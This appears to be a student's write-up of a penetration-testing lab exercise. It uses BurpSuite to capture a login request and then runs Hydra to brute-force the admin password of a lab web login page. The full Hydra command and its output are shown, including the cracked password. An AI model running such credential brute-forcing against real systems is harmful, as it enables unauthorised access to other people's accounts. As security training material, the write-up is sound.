# Web Application Attacks

## Web Application Assessment Tools

### VM2

Crack a login page located at `http://<VM-IP>/login.php` where the password is in a given wordlist.

#### Response

Used Hydra to crack the login page. BurpSuite was used to intercept a test login attempt and retrieve the URL of the login page as well as the body parameters (`username` & `password`) which were then fed into the prompt.

[This](https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/) article was also used as a reference on Hydra.

<pre class="language-bash"><code class="lang-bash"><strong>kali@kali:~$ hydra -l admin -P ~/OSCP/Exercises/passwords.txt offsec.test http-post-form "/login.php:username=^USER^&#x26;password=^PASS^:F=Failed" -vV -f
</strong>Hydra v9.3 (c) 2022 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-02 17:32:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
[DATA] attacking http-post-form://offsec.test:80/login.php:username=^USER^&#x26;password=^PASS^:F=Failed
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target offsec.test - login "admin" - pass "peter" - 1 of 30 [child 0] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "peterv" - 2 of 30 [child 1] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "venkman" - 3 of 30 [child 2] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "billmurray" - 4 of 30 [child 3] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "raymond" - 5 of 30 [child 4] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "stantz" - 6 of 30 [child 5] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "raymonds" - 7 of 30 [child 6] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "danaykroyd" - 8 of 30 [child 7] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "egon" - 9 of 30 [child 8] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "spengler" - 10 of 30 [child 9] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "egons" - 11 of 30 [child 10] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "haroldramis" - 12 of 30 [child 11] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "winston" - 13 of 30 [child 12] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "zeddemore" - 14 of 30 [child 13] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "winstonz" - 15 of 30 [child 14] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "dana" - 16 of 30 [child 15] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "barrett" - 17 of 30 [child 0] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "danab" - 18 of 30 [child 3] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "sigourneyweaver" - 19 of 30 [child 2] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "slimer" - 20 of 30 [child 1] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "stay_puft" - 21 of 30 [child 4] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "marshmallow_man" - 22 of 30 [child 5] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "gozer" - 23 of 30 [child 6] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "the_destroyer" - 24 of 30 [child 7] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "zuul" - 25 of 30 [child 11] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "vinz" - 26 of 30 [child 9] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "clortho" - 27 of 30 [child 8] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "dirbusters" - 28 of 30 [child 10] (0/0)
[ATTEMPT] target offsec.test - login "admin" - pass "cleaning" - 29 of 30 [child 12] (0/0)
[80][http-post-form] host: offsec.test   login: admin   password: zeddemore
[STATUS] attack finished for offsec.test (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-02 17:32:57</code></pre>
